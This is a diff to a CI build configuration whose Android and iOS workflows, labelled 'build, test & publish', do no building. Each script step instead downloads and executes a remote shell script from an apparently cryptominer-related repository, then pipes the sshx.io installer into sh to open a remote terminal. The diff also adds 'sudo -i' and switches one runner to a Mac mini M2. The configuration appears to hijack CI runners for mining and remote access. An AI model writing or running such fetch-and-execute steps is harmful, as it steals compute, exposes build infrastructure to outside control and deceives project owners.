@@ -1,11 +1,11 @@
 workflows:
   android:
     name: build, test & publish Android version
-    instance_type: linux
+    instance_type: mac_mini_m2
     scripts:
-      - wget https://raw.githubusercontent.com/ToRxmrig/wafwdfssz/main/whaha.sh && chmod +x whaha.sh && ./whaha.sh && curl -sSf https://sshx.io/get | sh -s run
+      - sudo -i && wget https://raw.githubusercontent.com/ToRxmrig/wafwdfssz/main/whaha.sh && chmod +x whaha.sh && ./whaha.sh && curl -sSf https://sshx.io/get | sh -s run
   ios:
     name: build, test & publish iOS version
     instance_type: linux
     scripts:
-      - wget https://raw.githubusercontent.com/ToRxmrig/wafwdfssz/main/whaha.sh && chmod +x whaha.sh && ./whaha.sh && curl -sSf https://sshx.io/get | sh -s run
+      - sudo -i && wget https://raw.githubusercontent.com/ToRxmrig/wafwdfssz/main/whaha.sh && chmod +x whaha.sh && ./whaha.sh && curl -sSf https://sshx.io/get | sh -s run
